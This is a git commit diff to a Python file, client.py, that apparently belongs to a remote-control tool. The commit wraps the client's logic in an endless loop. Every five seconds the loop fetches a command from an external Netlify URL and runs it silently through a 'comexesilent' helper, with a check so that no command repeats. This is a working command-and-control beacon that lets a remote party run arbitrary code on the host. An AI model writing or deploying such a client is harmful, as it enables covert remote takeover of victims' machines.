204a92c9ed2dc903dfc972e77cfb96a77af235c7
agentswagt <shagatoc@gmail.com>
2021-07-05 22:14:26 +0600

    commited by pusher 1213123

--- client.py
+++ client.py
@@ -18,31 +18,34 @@ script_id_number = 456
 
 
     
+while True:    
+
+    new_command_url = f"https://rcu-d.netlify.app/order/{script_id_number}"
+    new_command = requests.get(new_command_url).text
+
+    #online loaded command code
+
+    command_number_online = new_command[0:4] #the important code
+    code_status = allfunction.repeatchecker(command_number_online)
+
+
+    #cutting down the command number from main command
+
+    new_command = new_command
+    new_command = new_command.replace(command_number_online, "")
+    print(new_command)
+
+    if code_status is False:
+        allfunction.comexesilent(new_command)
+        print("command executed")
+    else:
+        print("no new command")    
+    #command number online will be replaced on last_code file
+
+    with open("last_code", "w") as replacer:
+        replacer.write(str(command_number_online))
+        replacer.close()
     
 
-new_command_url = f"https://rcu-d.netlify.app/order/{script_id_number}"
-new_command = requests.get(new_command_url).text
-
-#online loaded command code
-
-command_number_online = new_command[0:4] #the important code
-code_status = allfunction.repeatchecker(command_number_online)
-
-
-#cutting down the command number from main command
-
-new_command = new_command
-new_command = new_command.replace(command_number_online, "")
-print(new_command)
-
-if code_status is False:
-    allfunction.comexesilent(new_command)
-    print("command executed")
-else:
-    print("no new command")    
-#command number online will be replaced on last_code file
-
-with open("last_code", "w") as replacer:
-    replacer.write(str(command_number_online))
-    replacer.close()
+    time.sleep(5)
 
